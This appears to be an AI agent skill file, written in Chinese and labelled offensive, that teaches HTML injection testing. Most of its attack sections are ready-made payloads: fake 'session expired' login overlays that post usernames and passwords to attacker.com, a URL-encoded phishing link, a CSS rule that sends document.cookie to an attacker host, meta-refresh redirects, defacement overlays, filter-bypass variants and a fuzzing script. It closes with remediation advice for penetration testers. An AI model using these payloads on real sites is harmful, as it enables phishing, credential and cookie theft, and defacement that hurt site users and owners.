---
name: html-injection-testing
description: "识别和利用 HTML 注入漏洞，攻击者可向 Web 应用注入恶意 HTML 内容。此漏洞使攻击者能够修改页面外观、创建钓鱼页面并通过注入表单窃取用户凭证。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权安全评估、防御性验证或受控教育环境。

# HTML 注入测试

## 目的

识别和利用 HTML 注入漏洞，攻击者可向 Web 应用注入恶意 HTML 内容。此漏洞使攻击者能够修改页面外观、创建钓鱼页面并通过注入表单窃取用户凭证。

## 前提条件

### 所需工具
- 带开发者工具的 Web 浏览器
- Burp Suite 或 OWASP ZAP
- Tamper Data 或类似代理
- 用于测试载荷的 cURL

### 所需知识
- HTML 基础
- HTTP 请求/响应结构
- Web 应用输入处理
- HTML 注入与 XSS 的区别

## 输出与交付物

1. **漏洞报告** - 已识别的注入点
2. **利用证明** - 演示内容操纵
3. **影响评估** - 潜在钓鱼和篡改风险
4. **修复指导** - 输入验证建议

## 核心工作流

### 阶段 1：理解 HTML 注入

HTML 注入发生在用户输入未经适当清理即反射到网页时：

```html
<!-- 易受攻击代码示例 -->
<div>
    Welcome, <?php echo $_GET['name']; ?>
</div>

<!-- 攻击输入 -->
?name=<h1>Injected Content</h1>

<!-- 渲染输出 -->
<div>
    Welcome, <h1>Injected Content</h1>
</div>
```

与 XSS 的关键区别：
- HTML 注入：仅 HTML 标签被渲染
- XSS：JavaScript 代码被执行
- HTML 注入通常是 XSS 的跳板

攻击目标：
- 修改网站外观（篡改）
- 创建虚假登录表单（钓鱼）
- 注入恶意链接
- 显示误导性内容

### 阶段 2：识别注入点

映射应用的潜在注入面：

```
1. 搜索栏和搜索结果
2. 评论区域
3. 用户配置字段
4. 联系表单和反馈
5. 注册表单
6. 页面反射的 URL 参数
7. 错误消息
8. 页面标题和标题
9. 隐藏表单字段
10. 页面反射的 Cookie 值
```

常见易受攻击参数：
```
?name=
?user=
?search=
?query=
?message=
?title=
?content=
?redirect=
?url=
?page=
```

### 阶段 3：基础 HTML 注入测试

使用简单 HTML 标签测试：

```html
<!-- 基础文本格式化 -->
<h1>Test Injection</h1>
<b>Bold Text</b>
<i>Italic Text</i>
<u>Underlined Text</u>
<font color="red">Red Text</font>

<!-- 结构元素 -->
<div style="background:red;color:white;padding:10px">Injected DIV</div>
<p>Injected paragraph</p>
<br><br><br>Line breaks

<!-- 链接 -->
<a href="http://attacker.com">Click Here</a>
<a href="http://attacker.com">Legitimate Link</a>

<!-- 图像 -->
<img src="http://attacker.com/image.png">
<img src="x" onerror="alert(1)">  <!-- XSS 尝试 -->
```

测试工作流：
```bash
# 测试基础注入
curl "http://target.com/search?q=<h1>Test</h1>"

# 检查 HTML 是否在响应中渲染
curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"

# 以 URL 编码形式测试
curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
```

### 阶段 4：HTML 注入类型

#### 存储型 HTML 注入

载荷持久化存储在数据库中：

```html
<!-- 个人简介注入 -->
Name: John Doe
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <h1>Site Under Maintenance</h1>
     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
     </div>

<!-- 评论注入 -->
Great article!
<form action="http://attacker.com/steal" method="POST">
    <input name="username" placeholder="Session expired. Enter username:">
    <input name="password" type="password" placeholder="Password:">
    <input type="submit" value="Login">
</form>
```

#### 反射型 GET 注入

载荷在 URL 参数中：

```html
<!-- URL 注入 -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">

<!-- 搜索结果注入 -->
http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
```

#### 反射型 POST 注入

载荷在 POST 数据中：

```bash
# POST 注入测试
curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
     http://target.com/submit

# 表单字段注入
curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
     http://target.com/register
```

#### 基于 URL 的注入

注入到显示的 URL 中：

```html
<!-- 如果 URL 显示在页面上 -->
http://target.com/page/<h1>Injected</h1>

<!-- 基于路径的注入 -->
http://target.com/users/<img src=x>/profile
```

### 阶段 5：钓鱼攻击构建

创建令人信服的钓鱼表单：

```html
<!-- 虚假登录表单覆盖层 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:white;z-index:9999;padding:50px;">
    <h2>Session Expired</h2>
    <p>Your session has expired. Please log in again.</p>
    <form action="http://attacker.com/capture" method="POST">
        <label>Username:</label><br>
        <input type="text" name="username" style="width:200px;"><br><br>
        <label>Password:</label><br>
        <input type="password" name="password" style="width:200px;"><br><br>
        <input type="submit" value="Login">
    </form>
</div>

<!-- 隐藏凭证窃取器 -->
<style>
    input { background: url('http://attacker.com/log?data=') }
</style>
<form action="http://attacker.com/steal" method="POST">
    <input name="user" placeholder="Verify your username">
    <input name="pass" type="password" placeholder="Verify your password">
    <button>Verify</button>
</form>
```

URL 编码钓鱼链接：
```
http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
```

### 阶段 6：篡改载荷

网站外观操纵：

```html
<!-- 全页覆盖 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>HACKED BY SECURITY TESTER</h1>
</div>

<!-- 内容替换 -->
<style>body{display:none}</style>
<body style="display:block !important">
    <h1>This site has been compromised</h1>
</body>

<!-- 图像注入 -->
<img src="http://attacker.com/defaced.jpg" 
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">

<!-- 滚动字幕注入（可见移动） -->
<marquee behavior="alternate" style="font-size:50px;color:red;">
    SECURITY VULNERABILITY DETECTED
</marquee>
```

### 阶段 7：高级注入技术

#### CSS 注入

```html
<!-- 样式注入 -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- 内联样式注入 -->
<div style="background:url('http://attacker.com/log')">Content</div>
```

#### Meta 标签注入

```html
<!-- 通过 meta refresh 重定向 -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">

<!-- CSP 绕过尝试 -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### 表单动作覆盖

```html
<!-- 劫持现有表单 -->
<form action="http://attacker.com/steal">

<!-- 如果表单已存在，添加输入 -->
<input type="hidden" name="extra" value="data">
</form>
```

#### iframe 注入

```html
<!-- 嵌入外部内容 -->
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>

<!-- 不可见追踪 iframe -->
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```

### 阶段 8：绕过技术

规避基础过滤器：

```html
<!-- 大小写变体 -->
<H1>Test</H1>
<ScRiPt>alert(1)</ScRiPt>

<!-- 编码变体 -->
&#60;h1&#62;Encoded&#60;/h1&#62;
%3Ch1%3EURL%20Encoded%3C%2Fh1%3E

<!-- 标签拆分 -->
<h
1>Split Tag</h1>

<!-- 空字节 -->
<h1%00>Null Byte</h1>

<!-- 双重编码 -->
%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E

<!-- Unicode 编码 -->
\u003ch1\u003eUnicode\u003c/h1\u003e

<!-- 基于属性 -->
<div onmouseover="alert(1)">Hover me</div>
<img src=x onerror=alert(1)>
```

### 阶段 9：自动化测试

#### 使用 Burp Suite

```
1. 捕获带有潜在注入点的请求
2. 发送到 Intruder
3. 标记参数值为载荷位置
4. 加载 HTML 注入词表
5. 开始攻击
6. 过滤渲染 HTML 的响应
7. 手动验证成功注入
```

#### 使用 OWASP ZAP

```
1. 爬取目标应用
2. 使用 HTML 注入规则进行主动扫描
3. 查看注入发现的警报
4. 手动验证发现
```

#### 自定义模糊测试脚本

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target = "http://target.com/search"
param = "q"

payloads = [
    "<h1>Test</h1>",
    "<b>Bold</b>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<a href='http://evil.com'>Click</a>",
    "<div style='color:red'>Styled</div>",
    "<marquee>Moving</marquee>",
    "<iframe src='http://evil.com'></iframe>",
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded}"
    
    try:
        response = requests.get(url, timeout=5)
        if payload.lower() in response.text.lower():
            print(f"[+] Possible injection: {payload}")
        elif "<h1>" in response.text or "<b>" in response.text:
            print(f"[?] Partial reflection: {payload}")
    except Exception as e:
        print(f"[-] Error: {e}")
```

### 阶段 10：预防与修复

安全编码实践：

```php
// PHP：转义输出
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// PHP：去除标签
echo strip_tags($user_input);

// PHP：仅允许特定标签
echo strip_tags($user_input, '<p><b><i>');
```

```python
# Python：HTML 转义
from html import escape
safe_output = escape(user_input)

# Python Flask：自动转义
{{ user_input }}  # Jinja2 默认转义
{{ user_input | safe }}  # 标记为安全（危险！）
```

```javascript
// JavaScript：文本内容（安全）
element.textContent = userInput;

// JavaScript：innerHTML（危险！）
element.innerHTML = userInput;  // 易受攻击！

// JavaScript：清理
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

服务器端防护：
- 输入验证（白名单允许字符）
- 输出编码（上下文感知转义）
- 内容安全策略（CSP）头
- Web 应用防火墙（WAF）规则

## 快速参考

### 常见测试载荷

| 载荷 | 目的 |
|---------|---------|
| `<h1>Test</h1>` | 基础渲染测试 |
| `<b>Bold</b>` | 简单格式化 |
| `<a href="evil.com">Link</a>` | 链接注入 |
| `<img src=x>` | 图像标签测试 |
| `<div style="color:red">` | 样式注入 |
| `<form action="evil.com">` | 表单劫持 |

### 注入上下文

| 上下文 | 测试方法 |
|---------|---------------|
| URL 参数 | `?param=<h1>test</h1>` |
| 表单字段 | 带 HTML 载荷的 POST |
| Cookie 值 | 通过 document.cookie 注入 |
| HTTP 头 | 在 Referer/User-Agent 中注入 |
| 文件上传 | 带恶意内容的 HTML 文件 |

### 编码类型

| 类型 | 示例 |
|------|---------|
| URL 编码 | `%3Ch1%3E` = `<h1>` |
| HTML 实体 | `&#60;h1&#62;` = `<h1>` |
| 双重编码 | `%253C` = `<` |
| Unicode | `\u003c` = `<` |

## 约束与局限

### 攻击局限
- 现代浏览器可能清理某些注入
- CSP 可阻止内联样式和脚本
- WAF 可能阻止常见载荷
- 某些应用正确转义输出

### 测试考虑
- 区分 HTML 注入和 XSS
- 在浏览器中验证视觉影响
- 在多个浏览器中测试
- 检查存储型与反射型

### 严重性评估
- 严重性低于 XSS（无脚本执行）
- 与钓鱼结合时影响更高
- 考虑篡改/声誉损害
- 评估凭证窃取潜力

## 故障排除

| 问题 | 解决方案 |
|-------|-----------|
| HTML 未渲染 | 检查输出是否 HTML 编码；尝试编码变体；验证 HTML 上下文 |
| 载荷被剥离 | 使用编码变体；尝试标签拆分；测试空字节；嵌套标签 |
| XSS 不工作（仅 HTML） | JS 被过滤但 HTML 允许；利用钓鱼表单、meta refresh 重定向 |

## 何时使用
本技能适用于执行概述中描述的工作流程或操作。
